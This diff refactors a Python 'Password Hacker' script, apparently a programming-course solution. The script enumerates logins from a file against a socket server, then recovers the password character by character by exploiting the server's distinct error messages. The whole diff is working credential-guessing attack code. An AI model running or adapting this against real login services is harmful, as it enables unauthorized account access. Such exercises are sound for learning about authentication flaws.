@@ -1,13 +1,82 @@
-# $Password Hacker
+"""The functionality for hacking credentials: login and/or password."""
+
 import argparse
+import itertools
 import json
-import os
 import socket
 from string import ascii_letters, digits
-from itertools import product, count
+
+
+class PasswordHacker:
+    """The creation of the PasswordHacker object and related functionality."""
+    
+    chars = list(ascii_letters + digits)
+    n_ph = 0
+
+    def __init__(self, hostname, port):
+        """The initializer of the class.
+        
+        Arguments:
+        hostname -- string, IP or domain
+        port -- integer
+        """
+        self.hostname = hostname
+        self.port = port
+
+    def __new__(cls, *args, **kwargs):
+        if cls.n_ph == 0:
+            cls.n_ph += 1
+            return object.__new__(cls)
+        return None
+
+    def __repr__(self):
+        return f'Password Hacker object with:\n' \
+               f'IP ADDRESS: {self.hostname}\n' \
+               f'PORT: {self.port}\n'
+
+    def __str__(self):
+        return self.__repr__()
+
+    @staticmethod
+    def chars_iterator():
+        yield from itertools.cycle(PasswordHacker.chars)
+
+
+    def vulnerability_brute_force(self, logins_file):
+        """Algorithm used when the server sends guiding messages like 'wrong password'
+        Uses json module to serialize sent and received messages"""
+        with socket.socket() as client_socket:
+            client_socket.connect((self.hostname, self.port))
+            # find the login: save it in valid_login
+            valid_login = ''
+            with open(logins_file, 'r') as file:
+                for line in file:
+                    login = line.rstrip('\n')
+                    json_auth = json.dumps({"login": login, "password": ' '})
+                    client_socket.send(json_auth.encode())
+                    response = json.loads(client_socket.recv(1024).decode())
+                    if response['result'] == 'Wrong password!':
+                        valid_login = login
+                        break
+            # find password
+            password = ""
+            try:
+                for char in PasswordHacker.chars_iterator():
+                    password_guess = password + char
+                    json_auth = json.dumps({"login": valid_login, "password": password_guess})
+                    client_socket.send(json_auth.encode())
+                    response = json.loads(client_socket.recv(1024).decode())
+                    if response["result"] == "Connection success!":
+                        return json_auth
+                    elif response["result"] == "Exception happened during login":
+                        password = password_guess
+            except StopIteration:
+                return None
 
 
 def args():
+    """Get arguments from command line. Return parser object with attributes."""
+    
     parser = argparse.ArgumentParser(description="This program receives 2 arguments \
      and tries to connect to address with generated password through a socket")
     parser.add_argument("IP", help="Type IP address like 127.0.0.1 ")
@@ -17,74 +86,17 @@ def args():
     return parser.parse_args()
 
 
-def take_login():
+def main():
     file_name = r'C:\Users\Тоша\PycharmProjects\Password Hacker\Password Hacker\task\logins.txt'
-    with open(file_name, 'r', encoding='utf-8') as f:
-        login_list = f.readlines()
-        login_list = list(map(lambda x: x.replace('\n', ''), login_list))
-    for length in range(1, len(login_list) + 1):
-        for word in iter(login_list):
-            yield word
-
-
-def create_json(login, password=' '):
-    """take login or login+password. Return JSON. """
-    lp_dict = {}
-    lp_dict.update({'login': login, 'password': password})
-    return json.dumps(lp_dict)
-
-
-def send_request(client, request):
-    client.send(request.encode())  # converting to bytes, sending through socket
-    return client.recv(1024).decode()  # decoding from bytes to string
-
-
-def generate_password(client_, found_login, guess):
-    chars = list(ascii_letters + digits)
-    for character in chars:
-        password = guess + str(character)
-        data = create_json(found_login, password)
-        response = send_request(client_, data)
-        if response == json.dumps({"result": "Exception happened during login"}):
-            # print(response)
-            # print(password)
-            return password
-        elif response == json.dumps({"result": "Connection success!"}):
-            # print(response)
-            return ('found!', password)
-
-
-with socket.socket() as client_socket:
     arguments = args()
-    hostname = arguments.IP
-    port = int(arguments.port)
-    address = (hostname, port)
-    # print(address)
-    login_ = ''
-    
-    client_socket.connect(address)
-    # 1.Try all logins with an empty password.
-    for login in take_login():
-        # send the combination of login and password in JSON format
-        data = create_json(login)
-        response = send_request(client_socket, data)  # decoding from bytes to string
-        if response == json.dumps({"result": "Wrong password!"}):
-            # print('login found')
-            login_ = login
-            break
-    
-    password_ = ''
-    # print(password_)
-    for _ in range(100):
-    # while response != json.dumps({"result": "Connection success!"}):
-        password = generate_password(client_socket, login_, password_)
-        if password[0] == 'found!':
-            # print(password)
-            break
-        else:
-            data = create_json(login_, password)
-            response = send_request(client_socket, data)
-            password_ = password
-            
-    
-    print(create_json(login_, password[1]))
+    ip, port = arguments.IP, int(arguments.port)
+    hacker_object = PasswordHacker(ip, port)
+    result = hacker_object.vulnerability_brute_force(file_name)
+    if result is None:
+        print('-> Password not found <-')
+    else:
+        print(result)
+
+
+if __name__ == '__main__':
+    main()
